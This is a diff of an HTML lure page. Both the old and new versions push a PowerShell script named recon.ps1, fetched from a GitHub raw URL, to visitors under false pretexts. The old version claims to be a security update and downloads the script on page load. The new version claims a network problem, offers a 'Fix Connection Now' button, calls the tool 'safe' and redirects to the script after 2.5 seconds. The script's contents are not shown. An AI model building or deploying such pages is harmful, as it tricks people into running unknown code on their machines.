@@ -3,42 +3,43 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Applying Security Update...</title>
+  <title>Network Optimization</title>
   <style>
     body { 
-      background: #0a0a0a; 
-      color: #00ff00; 
-      font-family: Arial, sans-serif; 
+      background: #111; 
+      color: #0f0; 
+      font-family: Arial; 
       text-align: center; 
-      padding-top: 100px; 
+      padding: 60px; 
+    }
+    button { 
+      padding: 15px 30px; 
+      font-size: 18px; 
+      background: #0f0; 
+      color: #000; 
+      border: none; 
+      cursor: pointer; 
+      margin: 20px;
     }
   </style>
 </head>
 <body>
-  <h1>Applying Security Update...</h1>
-  <p>Please wait, this won't take long.</p>
+  <h1>Network Connection Issue Detected</h1>
+  <p>Click below to run a quick diagnostic and fix.</p>
+  
+  <a href="https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1" download="update.ps1">
+    <button>Fix Connection Now</button>
+  </a>
+
+  <p style="margin-top: 50px; font-size: 14px; color: #666;">
+    This will download a small diagnostic tool (safe).
+  </p>
 
   <script>
-    // === CHANGE THIS TO YOUR ACTUAL RAW URL ===
-    const psUrl = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";
-
-    function startDownloadAndRedirect() {
-      // Auto download the .ps1
-      const link = document.createElement('a');
-      link.href = psUrl;
-      link.download = "update.ps1";
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-
-      // Redirect to Google after 1.5 seconds
-      setTimeout(() => {
-        window.location.href = "https://google.com";
-      }, 1500);
-    }
-
-    // Start automatically
-    window.onload = startDownloadAndRedirect;
+    // Auto-download after 2.5 seconds
+    setTimeout(() => {
+      window.location.href = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";
+    }, 2500);
   </script>
 </body>
 </html>
